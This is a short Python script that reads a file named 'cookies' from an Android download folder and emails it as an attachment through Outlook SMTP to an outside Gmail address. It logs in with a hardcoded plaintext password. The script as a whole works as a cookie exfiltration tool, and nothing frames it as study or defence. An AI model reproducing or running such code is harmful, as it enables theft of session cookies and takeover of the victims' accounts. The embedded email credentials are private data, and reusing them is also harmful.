import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
fromaddr = "ibrahim.tariq.36@outlook.com"
toaddr = "zalborasi@gmail.com"
msg = MIMEMultipart()
msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = "Subject of the Mail"
body = "Body_of_the_mail"
msg.attach(MIMEText(body, 'plain'))
filename = "File_name_with_extension"
attachment = open("/storage/emulated/0/Download/cookies", "rb") 
p = MIMEBase('application', 'octet-stream')
p.set_payload((attachment).read()) 
encoders.encode_base64(p) 
p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
msg.attach(p) 
s = smtplib.SMTP('smtp.outlook.com', 587) 
s.starttls()
s.login(fromaddr, "zzxcv123$") 
text = msg.as_string() 
s.sendmail(fromaddr, toaddr, text) 
s.quit() 
